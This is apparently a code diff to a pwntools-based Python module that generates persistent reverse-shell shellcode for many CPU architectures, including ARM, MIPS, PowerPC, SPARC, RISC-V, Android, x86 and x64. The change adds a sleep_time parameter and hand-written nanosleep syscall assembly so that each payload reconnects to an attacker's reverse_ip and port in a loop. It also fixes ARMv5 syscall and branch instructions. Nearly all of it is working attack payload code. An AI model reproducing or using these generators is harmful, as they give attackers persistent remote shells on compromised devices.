@@ -26,7 +26,7 @@ add armebv7-power-reverse_sh
 
 
 
-def armelv7_power_reverse_shell(shell_path, reverse_ip, reverse_port, envp, filename= None):
+def armelv7_power_reverse_shell(shell_path, reverse_ip, reverse_port, envp, sleep_time,filename= None):
 	context.arch = 'arm'
 	context.endian = 'little'
 	context.bits = '32'
@@ -90,6 +90,16 @@ main_lab:
 
 	shellcode += shellcraft.wait4("r3")
 
+	shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
@@ -129,7 +139,7 @@ nop
 				return 
 
 
-def armebv7_power_reverse_shell(shell_path, reverse_ip, reverse_port , envp, filename=None):
+def armebv7_power_reverse_shell(shell_path, reverse_ip, reverse_port , envp, sleep_time,filename=None):
 	context.arch = 'arm'
 	context.endian = 'big'
 	context.bits = '32'
@@ -193,6 +203,16 @@ main_lab:
 
 	shellcode += shellcraft.wait4("r3")
 
+	shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
@@ -233,7 +253,7 @@ nop
 
 
 
-def aarch64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def aarch64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'aarch64'
 	context.endian = 'little'
 	context.bits = '64'
@@ -376,6 +396,16 @@ main_lab:
 
 	shellcode += shellcraft.wait4("x11")
 
+	shellcode += """
+LDR X12, ={time}
+eor x11, x11, x11
+str x11, [sp, #-8]!
+str x12, [sp, #-8]!
+mov x0, sp
+mov  x8, #0x65
+svc 0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
@@ -415,7 +445,7 @@ nop
 
 
 
-def mipsel_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsel_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips'
 	context.endian = 'little'
 	context.bits = '32'
@@ -480,6 +510,18 @@ main_lab:
 
 	shellcode += shellcraft.wait4("$s5")
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1046
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
@@ -516,10 +558,12 @@ nop
 			else:
 				return 
 
+'''
+sleep num 5034
+'''
 
 
-
-def mips_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips'
 	context.endian = 'big'
 	context.bits = '32'
@@ -584,6 +628,18 @@ main_lab:
 
 	shellcode += shellcraft.wait4("$s5")
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1046
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
@@ -628,7 +684,7 @@ mips64el-power
 '''
 
 
-def mips64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips64'
 	context.endian = 'big'
 	context.bits = '64'
@@ -805,6 +861,8 @@ xor $a0, $a0, $a0
 li  $v0, 0x01455
 syscall
 	'''
+
+
 	
 	shellcode += '''
 main_lab:
@@ -814,6 +872,20 @@ xor  $a2,$a2,$a2
 xor  $a3,$a3,$a3
 li   $v0,0x13c3
 syscall
+	'''
+	shellcode += """
+xor $a0, $a0, $a0
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+li  $t0,{time}
+daddiu $sp, $sp, -8
+sw   $t0, 4($sp)
+move $a0, $sp
+li  $v0, 5034
+syscall
+	""".format(time = sleep_time)
+
+	shellcode+='''
 j _start
 nop
 	'''
@@ -851,7 +923,7 @@ nop
 				return 
 
 
-def mips64el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips64el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips64'
 	context.endian = 'little'
 	context.bits = '64'
@@ -1032,6 +1104,19 @@ xor  $a2,$a2,$a2
 xor  $a3,$a3,$a3
 li   $v0,0x13c3
 syscall
+	'''
+	shellcode += """
+xor $a0, $a0, $a0
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+li  $t0,{time}
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+move $a0, $sp
+li  $v0, 5034
+syscall
+	""".format(time = sleep_time)
+	shellcode +='''
 j _start
 nop
 
@@ -1070,7 +1155,7 @@ nop
 
 
 
-def powerpc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def powerpc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'powerpc'
 	context.endian = 'big'
 	context.bits = '32'
@@ -1220,6 +1305,25 @@ xor 5,5,5
 xor 6,6,6
 li  0,0x72
 sc
+'''
+	sleep_time = int(sleep_time,16)
+	sleep_time_high = sleep_time>>16 &0xffff
+	sleep_time_low = sleep_time & 0xffff
+	shellcode += """
+mr 31, 1
+li 0, 0xa2
+xor  3,3,3
+subi 31, 31, 4
+stw  3, 0(31)
+lis r3, {time_high}
+ori r3, r3, {time_low}
+subi 31, 31, 4
+stw  3, 0(31)
+mr  3, 31
+sc
+""".format(time_high=sleep_time_high,time_low = sleep_time_low)
+
+	shellcode +='''
 b _start
 nop
 	'''
@@ -1257,7 +1361,7 @@ nop
 				return 
 
 
-def powerpcle_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def powerpcle_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'powerpc'
 	context.endian = 'little'
 	context.bits = '32'
@@ -1411,6 +1515,25 @@ xor 5,5,5
 xor 6,6,6
 li  0,0x72
 sc
+'''
+	sleep_time = int(sleep_time,16)
+	sleep_time_high = sleep_time>>16 &0xffff
+	sleep_time_low = sleep_time & 0xffff
+	shellcode += """
+mr 31, 1
+li 0, 0xa2
+xor  3,3,3
+subi 31, 31, 4
+stw  3, 0(31)
+lis r3, {time_high}
+ori r3, r3, {time_low}
+subi 31, 31, 4
+stw  3, 0(31)
+mr  3, 31
+sc
+""".format(time_high=sleep_time_high,time_low = sleep_time_low)
+
+	shellcode += '''
 b _start
 nop
 	'''
@@ -1453,7 +1576,7 @@ riscv64 power
 Android power
 '''
 
-def riscv64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def riscv64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'riscv'
 	context.endian = 'little'
 	context.bits = '64'
@@ -1603,7 +1726,7 @@ j _start
 				return 
 
 
-def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'aarch64'
 	context.endian = 'little'
 	context.bits = '64'
@@ -1744,6 +1867,17 @@ main_lab:
 
 	shellcode += shellcraft.wait4("x11")
 
+
+	shellcode += """
+LDR X12, ={time}
+eor x11, x11, x11
+str x11, [sp, #-8]!
+str x12, [sp, #-8]!
+mov x0, sp
+mov  x8, #0x65
+svc 0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
@@ -1790,7 +1924,7 @@ sparc64_power
 '''
 
 
-def sparc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def sparc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'sparc'
 	context.endian = 'big'
 	context.bits = '32'
@@ -1975,7 +2109,7 @@ nop
 			else:
 				return 
 
-def sparc64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def sparc64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'sparc64'
 	context.endian = 'big'
 	context.bits = '64'
@@ -2158,7 +2292,7 @@ nop
 
 
 
-def x86_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def x86_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'i386'
 	context.endian = 'little'
 	context.bits = '32'
@@ -2204,8 +2338,13 @@ main_lab:
 	pop eax
 	xor ebx,ebx
 	int 0x80
+	push 0x0
+	push {time}
+	mov  ebx, esp
+	mov eax, 162
+	int 0x80
 	jmp _start
-	'''
+	'''.format(time=sleep_time)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -2240,7 +2379,7 @@ main_lab:
 
 
 
-def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='little'
@@ -2300,9 +2439,6 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 	add r4,sp,#-0x1d
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
@@ -2321,22 +2457,22 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2344,7 +2480,7 @@ def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 
@@ -2356,8 +2492,19 @@ main_lab:
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
@@ -2410,9 +2557,6 @@ nop
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
@@ -2432,22 +2576,22 @@ nop
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -2455,7 +2599,7 @@ nop
 	push {r0}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 		shellcode += shellcraft.exit(0)
@@ -2466,8 +2610,18 @@ main_lab:
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
@@ -2530,7 +2684,7 @@ nop
 				return 
 
 
-def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='big'
@@ -2589,9 +2743,6 @@ def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filen
 	add r4,sp,#-0x1d
 	add r8,sp,#-0x20
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
@@ -2643,8 +2794,19 @@ main_lab:
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
@@ -2699,9 +2861,6 @@ nop
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
@@ -2755,8 +2914,19 @@ main_lab:
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
@@ -2820,7 +2990,7 @@ nop
 				return 
 
 
-def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'amd64'
 	context.endian = 'little'
 	context.bits = '64'
@@ -2866,8 +3036,13 @@ main_lab:
 	pop rax
 	xor rdi,rdi
 	syscall
+	push 0x0
+	push {time}
+	mov  rdi, rsp
+	mov rax, 35
+	syscall
 	jmp _start
-	'''
+	'''.format(time=sleep_time)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -2905,10 +3080,11 @@ add 2023.2.28
 fork 0x0017a7
 wait4 0x0017ab
 exit 0x00183d
+sleep 0x00001792
 '''
 
 
-def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
 	context.arch = 'mipsn32'
 	context.endian = "big"
@@ -3106,6 +3282,18 @@ li      $v0, 0x0017ab
 syscall 0x40404
 	"""
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1792
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
@@ -3143,7 +3331,7 @@ nop
 				return 
 			
 
-def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time ,filename=None):
 	context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
 	context.arch = 'mipsn32el'
 	context.endian = "little"
@@ -3336,6 +3524,18 @@ slti    $a3, $zero, -1
 li      $v0, 0x0017ab
 syscall 0x40404
 	"""
+
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1792
+syscall 0x40404
+	""".format(time=sleep_time)
 
 	shellcode += '''
 j __start
